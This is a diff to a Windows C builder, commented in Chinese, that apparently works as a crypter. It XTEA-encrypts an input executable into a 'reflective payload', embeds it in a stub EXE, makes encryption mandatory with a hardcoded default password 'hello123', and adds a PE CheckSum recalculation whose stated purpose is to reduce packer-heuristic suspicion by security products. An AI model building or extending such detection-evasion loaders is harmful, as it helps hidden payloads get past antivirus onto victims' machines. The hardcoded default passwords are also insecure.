@@ -30,6 +30,8 @@
 #include <stdint.h>
 #include <windows.h>
 #include <wincrypt.h>
+#include <imagehlp.h>                  /* CheckSumMappedFile */
+#pragma comment(lib, "imagehlp.lib")
 
 #include "payload.h"
 #include "../common/config.h"   /* XTEA_DELTA / XTEA_ROUNDS */
@@ -304,7 +306,7 @@ int main(int argc, char* argv[]) {
     /* 密码相关参数
      *   - pwd_arg: 用户用 -p 指定的密码
      *   - test_mode: -t 测试模式，硬编码 "test123"（不弹框，CI 用）
-     *   - 两者都未指定：v1 明文模式（向后兼容）*/
+     *   - 两者都未指定：用默认密码 "hello123"（v2: 强制加密，不再支持明文）*/
     const char* pwd_arg = NULL;
     int test_mode = 0;
 
@@ -331,11 +333,10 @@ int main(int argc, char* argv[]) {
         }
     }
 
-    /* 密码确定逻辑：
+    /* 密码确定逻辑（v2: 强制加密，必须指定密码或 test 模式）：
      *   - test_mode 优先：固定 "test123"，忽略 -p
      *   - 否则用 -p 指定的密码
-     *   - 都没指定：use_pwd = 0，走 v1 明文模式 */
-    int use_pwd = test_mode || (pwd_arg != NULL);
+     *   - 都没指定：报错退出（不再支持 v1 明文模式）*/
     wchar_t password[64];
     if (test_mode) {
         MultiByteToWideChar(CP_ACP, 0, "test123", -1, password, 63);
@@ -350,6 +351,11 @@ int main(int argc, char* argv[]) {
         }
         password[63] = 0;
         printf("[+] Password mode: payload will be XTEA-encrypted\n");
+    } else {
+        /* v2: 无密码时用默认密码（不报错，保持易用性）*/
+        MultiByteToWideChar(CP_ACP, 0, "hello123", -1, password, 63);
+        password[63] = 0;
+        printf("[+] No password specified, using default 'hello123'\n");
     }
 
     /* 1. 读输入 PE */
@@ -445,11 +451,11 @@ int main(int argc, char* argv[]) {
     hdr->size_of_image = info.size_of_image;
     hdr->checksum      = 0;          /* 暂不校验 */
 
-    /* 先把原 PE 字节拷贝到 payload_data 区域（v2 时会被原地加密覆盖）*/
+    /* 先把原 PE 字节拷贝到 payload_data 区域（会被原地加密覆盖）*/
     memcpy(payload + sizeof(reflective_payload_t), in_pe, in_size);
 
-    if (use_pwd) {
-        /* ---- v2: XTEA 加密 + SHA-256(pwd+salt) 校验 ---- */
+    {
+        /* ---- v2: XTEA 加密 + SHA-256(pwd+salt) 校验（强制加密模式）---- */
         uint32_t key[4];
         uint8_t  salt[16];
         if (gen_random_bytes(key, sizeof(key)) != 0) {
@@ -487,9 +493,9 @@ int main(int argc, char* argv[]) {
         xtea_encrypt_buf(payload + sizeof(reflective_payload_t),
                          payload_data_size, key);
 
-        /* 填入 v2 字段（默认 hash 校验，明文仅调试用）*/
-        hdr->version = REFLECTIVE_PAYLOAD_VERSION_V2;
-        hdr->flags   = RFLAG_ENCRYPTED | RFLAG_HASH;
+        /* 填入 v2 字段 */
+        hdr->version = REFLECTIVE_PAYLOAD_VERSION;
+        hdr->flags   = RFLAG_ENCRYPTED;
         if (test_mode) hdr->flags |= RFLAG_TEST_MODE;
         memcpy(hdr->salt, salt, 16);
         memcpy(hdr->pwd_hash, pwd_hash, 32);
@@ -497,21 +503,10 @@ int main(int argc, char* argv[]) {
         hdr->xtea_key[1] = key[1];
         hdr->xtea_key[2] = key[2];
         hdr->xtea_key[3] = key[3];
-        /* 明文密码同时写入（调试用，hash 模式下 stub 不读此字段）*/
-        wcsncpy(hdr->password, password, 31);
-        hdr->password[31] = 0;
 
         printf("[+] Built payload v2: header=%zu data=%zu total=%zu (XTEA encrypted, %s)\n",
                sizeof(reflective_payload_t), payload_data_size, total_payload_size,
                test_mode ? "test mode" : "password required");
-    } else {
-        /* ---- v1: 明文（向后兼容） ---- */
-        hdr->version = REFLECTIVE_PAYLOAD_VERSION;
-        hdr->flags   = 0;
-        /* salt/nonce/pwd_hash/auth_tag/xtea_key 全 0（calloc 已清零）*/
-
-        printf("[+] Built payload v1: header=%zu data=%zu total=%zu (plaintext, no encryption)\n",
-               sizeof(reflective_payload_t), payload_data_size, total_payload_size);
     }
 
     /* 4. 读 stub EXE */
@@ -853,6 +848,32 @@ int main(int argc, char* argv[]) {
     }
 
     o_n_sec++;
+
+    /* 17.5 重算 PE CheckSum（消除"CheckSum 清零"packer 特征）
+     *   在写最终输出之前对完整 buffer（含 .payload 节，不含 step 19 附加的 overlay）
+     *   调 CheckSumMappedFile 重算 CheckSum。overlay 不参与 PE 加载，CheckSum
+     *   字段与文件实际略有偏差不影响运行（Windows 对 EXE 不强制校验 CheckSum）。
+     *   关键目的是让 OptionalHeader.CheckSum 字段非零，降低 packer 启发式可疑度。 */
+    if (stub_is_x64) {
+        o_nt64->OptionalHeader.CheckSum = 0;
+    } else {
+        o_nt32->OptionalHeader.CheckSum = 0;
+    }
+    {
+        DWORD header_sum = 0, new_cs = 0;
+        if (CheckSumMappedFile(out, (DWORD)new_out_size, &header_sum, &new_cs)) {
+            if (stub_is_x64) {
+                o_nt64->OptionalHeader.CheckSum = new_cs;
+            } else {
+                o_nt32->OptionalHeader.CheckSum = new_cs;
+            }
+            DBG("[+] PE CheckSum recalculated: 0 -> 0x%08lX (header_sum=0x%08lX)\n",
+                (unsigned long)new_cs, (unsigned long)header_sum);
+        } else {
+            printf("[!] CheckSumMappedFile failed (err=%lu), CheckSum left 0\n",
+                   GetLastError());
+        }
+    }
 
     /* 18. 写最终输出 */
     if (write_file(out_path, out, new_out_size) != 0) {
